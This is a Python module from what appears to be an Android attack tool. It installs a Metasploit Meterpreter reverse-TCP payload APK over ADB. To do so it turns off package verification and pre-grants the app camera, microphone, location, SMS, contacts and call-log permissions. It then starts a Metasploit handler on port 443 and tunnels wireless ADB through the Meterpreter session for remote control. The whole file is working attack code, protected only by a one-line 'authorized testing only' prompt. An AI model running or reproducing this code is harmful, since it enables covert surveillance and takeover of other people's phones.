import os
import socket
import subprocess
import time
from pathlib import Path

from modules.config import AppConfig
from modules import banner
from modules.console import console, confirm, adb, task_status, get_adb_executable, ask, go_back_to_main_menu


# Permissions to pre-grant via ADB
_PERMISSIONS = [
    "CAMERA",
    "RECORD_AUDIO",
    "ACCESS_FINE_LOCATION",
    "ACCESS_COARSE_LOCATION",
    "ACCESS_BACKGROUND_LOCATION",
    "READ_CONTACTS",
    "WRITE_CONTACTS",
    "READ_SMS",
    "SEND_SMS",
    "RECEIVE_SMS",
    "READ_CALL_LOG",
    "WRITE_CALL_LOG",
    "READ_PHONE_STATE",
    "READ_PHONE_NUMBERS",
    "CALL_PHONE",
    "PROCESS_OUTGOING_CALLS",
    "READ_EXTERNAL_STORAGE",
    "WRITE_EXTERNAL_STORAGE",
    "READ_MEDIA_IMAGES",
    "READ_MEDIA_VIDEO",
    "READ_MEDIA_AUDIO",
    "POST_NOTIFICATIONS",
]

PKG = "com.metasploit.stage"
LHOST = "0.0.0.0"
LPORT = "443"
PAYLOAD = "android/meterpreter_reverse_tcp"


def _wait_for_port(host: str, port: int, timeout: int = 30) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1):
                return True
        except OSError:
            time.sleep(1)
    return False


def hack(config: AppConfig) -> None:
    os.system(config.clear_cmd)
    console.print(banner.instructions_banner)
    console.print(banner.instruction)
    choice = ask("[prompt]> [/prompt]")

    if choice != "":
        go_back_to_main_menu(config, "Attack cancelled")
        return

    os.system(config.clear_cmd)

    # Locate pre-built APK next to this script (project root)
    project_root = Path(__file__).resolve().parent.parent
    apk_out = project_root / "test.apk"
    if not apk_out.is_file():
        console.print(
            f"[bold red]test.apk not found at {apk_out}[/bold red]\n"
            "[bold yellow]Re-build it from the android-apk-meterpreter-android14 workflow first.[/bold yellow]"
        )
        return

    console.print(
        f"[bold cyan]Using pre-built APK:[/bold cyan] [bold white]{apk_out}[/bold white]\n"
        f"[bold cyan]Handler:[/bold cyan] [bold white]{LHOST}:{LPORT}[/bold white]  "
        f"[bold cyan]Payload:[/bold cyan] [bold white]{PAYLOAD}[/bold white]"
    )

    if not confirm(
        "[bold red]WARNING:[/bold red] Payload install, security settings changes, Metasploit. "
        "Authorized testing only. Continue?"
    ):
        console.print("[bold green]Cancelled.[/bold green]")
        return

    console.print(banner.hacking_banner)

    msfconsole = config.msfconsole_path or "msfconsole"
    adb_exe = get_adb_executable() or "adb"

    # --- Prepare device ---
    with task_status("[info]Preparing device…[/info]"):
        adb(["shell", "input", "keyevent", "3"])
        adb(["shell", "settings", "put", "global", "package_verifier_enable", "0"])
        adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "0"])

    # --- Uninstall old version if present ---
    with task_status("[info]Removing old payload if present…[/info]"):
        subprocess.run(
            [adb_exe, "uninstall", PKG],
            capture_output=True,
            text=True,
        )

    # --- Install APK ---
    with task_status("[info]Installing payload APK…[/info]"):
        install = subprocess.run(
            [adb_exe, "install", "--bypass-low-target-sdk-block", "-r", str(apk_out)],
            capture_output=True,
            text=True,
        )
    if install.returncode != 0:
        detail = (install.stdout + install.stderr).strip() or f"exit code {install.returncode}"
        console.print(f"[bold red]adb install failed:[/bold red] {detail}")
        adb(["shell", "settings", "put", "global", "package_verifier_enable", "1"])
        adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "1"])
        return

    # --- Pre-grant permissions ---
    with task_status("[info]Granting permissions…[/info]"):
        adb(["shell", "cmd", "deviceidle", "whitelist", f"+{PKG}"])
        adb(["shell", "cmd", "appops", "set", PKG, "RUN_IN_BACKGROUND", "allow"])
        adb(["shell", "cmd", "appops", "set", PKG, "RUN_ANY_IN_BACKGROUND", "allow"])
        for perm in _PERMISSIONS:
            subprocess.run(
                [adb_exe, "shell", "pm", "grant", PKG, f"android.permission.{perm}"],
                capture_output=True,
                text=True,
            )

    # --- Restore app verification ---
    with task_status("[info]Restoring app verification…[/info]"):
        adb(["shell", "settings", "put", "global", "package_verifier_enable", "1"])
        adb(["shell", "settings", "put", "global", "verifier_verify_adb_installs", "1"])

    # --- Enable wireless ADB ---
    with task_status("[info]Enabling wireless ADB (tcpip 5555)…[/info]"):
        adb(["tcpip", "5555"])
        time.sleep(2)  # adbd restarts; USB connection drops briefly

    # --- Launch app ---
    with task_status("[info]Launching payload…[/info]"):
        adb(["shell", "monkey", "-p", PKG, "1"])

    # --- Prepare portfwd RC (must exist before handler starts) ---
    portfwd_rc_file = "/tmp/ps_portfwd.rc"
    Path(portfwd_rc_file).write_text(
        "portfwd add -l 5555 -p 5555 -r 127.0.0.1\n"
        "background\n"
    )

    # --- Build handler RC with AutoRunScript for portfwd ---
    log_file = "/tmp/ps_msf.log"
    rc_content = (
        f"use exploit/multi/handler\n"
        f"set PAYLOAD {PAYLOAD}\n"
        f"set LHOST {LHOST}\n"
        f"set LPORT {LPORT}\n"
        f"set ExitOnSession false\n"
        f"set SessionsLimit 1\n"
        f"set AutoRunScript multi_console_command -r {portfwd_rc_file}\n"
        f"exploit -j -z\n"
    )
    rc_file = "/tmp/ps_handler.rc"
    Path(rc_file).write_text(rc_content)

    # Kill any stale tmux session; clear the log
    subprocess.run(["tmux", "kill-session", "-t", "ps_handler"], capture_output=True)
    Path(log_file).write_text("")

    # Launch msfconsole inside tmux so it gets a real PTY (no stty errors)
    console.print("[bold red]Starting msfconsole handler via tmux…[/bold red]")
    subprocess.Popen(
        ["tmux", "new-session", "-d", "-s", "ps_handler",
         f"msfconsole -q -r {rc_file} 2>&1 | tee {log_file}"],
        start_new_session=True,
    )

    # --- Poll for Meterpreter session ---
    console.print("[bold yellow]Waiting for Meterpreter session (up to 90s)…[/bold yellow]")
    deadline = time.time() + 90
    session_opened = False
    while time.time() < deadline:
        try:
            log = Path(log_file).read_text()
            if "Meterpreter session" in log:
                session_opened = True
                break
        except OSError:
            pass
        time.sleep(2)

    if not session_opened:
        console.print(
            "[bold red]No Meterpreter session within 90s.[/bold red]\n"
            f"[bold yellow]Check handler log: {log_file}[/bold yellow]\n"
            "[bold yellow]Is the phone connected to internet? Is port 443 forwarded?[/bold yellow]"
        )
        return

    console.print("[bold green]Meterpreter session opened![/bold green]")
    console.print("[bold yellow]AutoRunScript running portfwd — waiting for tunnel…[/bold yellow]")

    # --- Wait for local :5555 to be live ---
    with task_status("[info]Waiting for local :5555…[/info]"):
        ready = _wait_for_port("127.0.0.1", 5555, timeout=20)

    if not ready:
        console.print(
            "[bold red]Port 5555 not listening after portfwd — tunnel may have failed.[/bold red]\n"
            "[bold yellow]Try: adb connect 127.0.0.1:5555 manually after portfwd.[/bold yellow]"
        )
        return

    # --- ADB connect over tunnel ---
    with task_status("[info]adb connect 127.0.0.1:5555…[/info]"):
        result = subprocess.run(
            [adb_exe, "connect", "127.0.0.1:5555"],
            capture_output=True,
            text=True,
        )

    out = (result.stdout + result.stderr).strip()
    if "connected" in out.lower():
        console.print(f"[bold green]Connected via Meterpreter tunnel: {out}[/bold green]")
        console.print("[bold cyan]USB cable can now be unplugged.[/bold cyan]")
    else:
        console.print(f"[bold red]adb connect failed:[/bold red] {out}")
